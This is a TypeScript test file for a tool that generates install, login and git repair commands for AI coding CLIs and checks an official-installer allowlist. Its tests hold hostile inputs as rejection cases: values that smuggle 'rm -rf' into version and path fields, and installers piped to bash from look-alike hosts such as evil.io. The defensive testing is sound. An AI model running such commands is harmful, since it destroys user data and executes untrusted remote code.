import { describe, expect, it } from 'vitest'
import {
  OFFICIAL_INSTALLERS,
  commandFor,
  docsUrlFor,
  gitInstallCommand,
  isAllowedDocsUrl,
  isOfficialInstaller,
  osFamily,
  repairCommand,
} from '@core/heal/commands.ts'
import type { CommandKind, OsFamily } from '@core/heal/commands.ts'

// The install and setup commands table, verbatim.
const C2: [CommandKind, string, OsFamily, string][] = [
  ['install', 'claude', 'win32', 'irm https://claude.ai/install.ps1 | iex'],
  ['install', 'claude', 'darwin', 'curl -fsSL https://claude.ai/install.sh | bash'],
  ['install', 'claude', 'linux', 'curl -fsSL https://claude.ai/install.sh | bash'],
  ['login', 'claude', 'win32', 'claude auth login'],
  ['login', 'claude', 'linux', 'claude auth login'],
  ['update', 'claude', 'darwin', 'claude update'],
  [
    'install',
    'codex',
    'win32',
    'powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"',
  ],
  ['install', 'codex', 'darwin', 'npm install -g @openai/codex@latest'],
  ['install', 'codex', 'linux', 'npm install -g @openai/codex@latest'],
  ['login', 'codex', 'win32', 'codex login'],
  ['login', 'codex', 'linux', 'codex login'],
  ['install', 'gemini', 'win32', 'npm install -g @google/gemini-cli@latest'],
  ['install', 'gemini', 'linux', 'npm install -g @google/gemini-cli@latest'],
  ['login', 'gemini', 'darwin', 'gemini'],
]

describe('commandFor (the commands table)', () => {
  it.each(C2)('%s %s on %s', (kind, vendor, os, command) => {
    const c = commandFor(kind, vendor, os)!
    expect(c.command).toBe(command)
    expect(c.shell).toBe(os === 'win32' ? 'powershell' : 'sh')
  })

  it('pins the tested version through npm', () => {
    expect(commandFor('pin', 'claude', 'win32', '2.1.287')!.command).toBe(
      'npm install -g @anthropic-ai/claude-code@2.1.287',
    )
    expect(commandFor('pin', 'codex', 'linux', '0.160.0')!.command).toBe(
      'npm install -g @openai/codex@0.160.0',
    )
    expect(commandFor('pin', 'gemini', 'darwin', '0.62.0')!.command).toBe(
      'npm install -g @google/gemini-cli@0.62.0',
    )
    expect(commandFor('pin', 'claude', 'win32')).toBeNull()
    expect(commandFor('pin', 'claude', 'win32', '2.1; rm -rf /')).toBeNull()
    expect(commandFor('pin', 'grok', 'win32', '1.0.0')).toBeNull()
  })

  it('Codex sandbox setup is Windows-only and elevated', () => {
    expect(commandFor('sandboxSetup', 'codex', 'win32')).toEqual({
      command: 'codex sandbox setup --elevated --current-user',
      shell: 'powershell',
      elevated: true,
    })
    expect(commandFor('sandboxSetup', 'codex', 'linux')).toBeNull()
    expect(commandFor('sandboxSetup', 'claude', 'win32')).toBeNull()
  })

  it('offers an ANTHROPIC_API_KEY unset for Claude only', () => {
    expect(commandFor('unsetApiKey', 'claude', 'linux')!.command).toBe('unset ANTHROPIC_API_KEY')
    expect(commandFor('unsetApiKey', 'claude', 'win32')!.command).toContain(
      "SetEnvironmentVariable('ANTHROPIC_API_KEY', $null, 'User')",
    )
    expect(commandFor('unsetApiKey', 'codex', 'linux')).toBeNull()
  })

  it('returns null for vendors without commands', () => {
    expect(commandFor('install', 'opencode', 'linux')).toBeNull()
    expect(commandFor('login', 'opencode', 'win32')).toBeNull()
  })

  it('Grok installs with its official installer, signs in with `grok login`, updates itself', () => {
    expect(commandFor('install', 'grok', 'win32')).toEqual({
      command: 'irm https://x.ai/cli/install.ps1 | iex',
      shell: 'powershell',
    })
    expect(commandFor('install', 'grok', 'linux')).toEqual({
      command: 'curl -fsSL https://x.ai/cli/install.sh | bash',
      shell: 'sh',
    })
    expect(commandFor('install', 'grok', 'darwin')!.command).toBe(
      'curl -fsSL https://x.ai/cli/install.sh | bash',
    )
    expect(commandFor('login', 'grok', 'win32')).toEqual({ command: 'grok login', shell: 'powershell' })
    expect(commandFor('update', 'grok', 'linux')).toEqual({ command: 'grok update', shell: 'sh' })
    expect(commandFor('pin', 'grok', 'linux', '1.0.50')).toBeNull()
    // Not in the original commands table: copied for the user, never exempt from the heal shell denylist.
    expect(isOfficialInstaller('irm https://x.ai/cli/install.ps1 | iex')).toBe(false)
    expect(isOfficialInstaller('curl -fsSL https://x.ai/cli/install.sh | bash')).toBe(false)
  })

  it('Muse installs with its official installer and signs in by running it once', () => {
    expect(commandFor('install', 'muse', 'win32')).toEqual({
      command: 'irm https://dev.meta.ai/install.ps1 | iex',
      shell: 'powershell',
    })
    expect(commandFor('install', 'muse', 'linux')).toEqual({
      command: 'curl -fsSL https://dev.meta.ai/install.sh | sh',
      shell: 'sh',
    })
    expect(commandFor('update', 'muse', 'darwin')!.command).toBe(
      'curl -fsSL https://dev.meta.ai/install.sh | sh',
    )
    expect(commandFor('login', 'muse', 'win32')).toEqual({
      command: 'muse',
      shell: 'powershell',
      note: 'Run it once and sign in.',
    })
    expect(commandFor('pin', 'muse', 'linux', '1.4.2')).toBeNull()
    // Not in the original commands table: copied for the user, never exempt from the heal shell denylist.
    expect(isOfficialInstaller('irm https://dev.meta.ai/install.ps1 | iex')).toBe(false)
    expect(isOfficialInstaller('curl -fsSL https://dev.meta.ai/install.sh | sh')).toBe(false)
  })

  it('git install per OS', () => {
    expect(gitInstallCommand('win32').command).toBe('winget install --id Git.Git -e')
    expect(gitInstallCommand('darwin').command).toBe('xcode-select --install')
    expect(gitInstallCommand('linux').note).toMatch(/package manager/)
  })

  it('maps platforms to OS families', () => {
    expect(osFamily('win32')).toBe('win32')
    expect(osFamily('darwin')).toBe('darwin')
    expect(osFamily('freebsd')).toBe('linux')
  })
})

describe('repairCommand', () => {
  it('builds safe.directory with a quoted forward-slash path and refuses quotes', () => {
    expect(repairCommand('safeDirectory', 'win32', 'C:\\Users\\me\\repo')!.command).toBe(
      'git config --global --add safe.directory "C:/Users/me/repo"',
    )
    expect(repairCommand('safeDirectory', 'linux', '/x"; rm -rf ~; "')).toBeNull()
    expect(repairCommand('safeDirectory', 'linux')).toBeNull()
  })

  it('aborts only known operations', () => {
    expect(repairCommand('abort', 'linux', 'rebase')!.command).toBe('git rebase --abort')
    expect(repairCommand('abort', 'linux', 'bisect')!.command).toBe('git bisect reset')
    expect(repairCommand('abort', 'linux', 'reset --hard')).toBeNull()
  })

  it('fixed repair commands', () => {
    expect(repairCommand('worktreePrune', 'win32')!.command).toBe('git worktree prune')
    expect(repairCommand('longPaths', 'win32')!.command).toBe('git config --global core.longpaths true')
    expect(repairCommand('lfsInstall', 'darwin')!.command).toBe('git lfs install')
    expect(repairCommand('ollamaServe', 'linux')!.command).toBe('ollama serve')
  })
})

describe('official installer allowlist', () => {
  it('accepts exactly the table installers (whitespace-insensitive)', () => {
    for (const i of OFFICIAL_INSTALLERS) expect(isOfficialInstaller(i)).toBe(true)
    expect(isOfficialInstaller('  irm   https://claude.ai/install.ps1 |   iex ')).toBe(true)
    expect(isOfficialInstaller('npm install -g @anthropic-ai/claude-code@2.1.287')).toBe(true)
    expect(isOfficialInstaller('npm install -g @openai/codex@latest')).toBe(true)
  })

  it('rejects look-alikes and appended commands', () => {
    for (const c of [
      'irm https://claude.ai.evil.io/install.ps1 | iex',
      'curl -fsSL https://claude.ai/install.sh | bash; rm -rf ~',
      'curl -fsSL https://evil.io/install.sh | bash',
      'iwr https://claude.ai/install.ps1 | iex',
      'npm install -g @anthropic-ai/claude-code@2.1.287 && curl x | sh',
      'npm install -g evil-package@1.0.0',
      'npm install -g @anthropic-ai/claude-code@latest; whoami',
    ])
      expect(isOfficialInstaller(c)).toBe(false)
  })
})

describe('docs', () => {
  it('only https allowlisted hosts', () => {
    for (const v of ['claude', 'codex', 'gemini', 'grok', 'muse'])
      expect(isAllowedDocsUrl(docsUrlFor(v)!)).toBe(true)
    // Muse's setup guide is on Meta's own host; (review) Grok Build's user guide is in its public repository.
    expect(docsUrlFor('muse')).toBe('https://dev.meta.ai/docs/muse-code')
    expect(docsUrlFor('grok')).toBe('https://github.com/xai-org/grok-build')
    expect(docsUrlFor('opencode')).toBeNull()
    expect(isAllowedDocsUrl('http://code.claude.com/docs')).toBe(false)
    expect(isAllowedDocsUrl('https://evil.io/docs')).toBe(false)
    expect(isAllowedDocsUrl('nope')).toBe(false)
  })
})
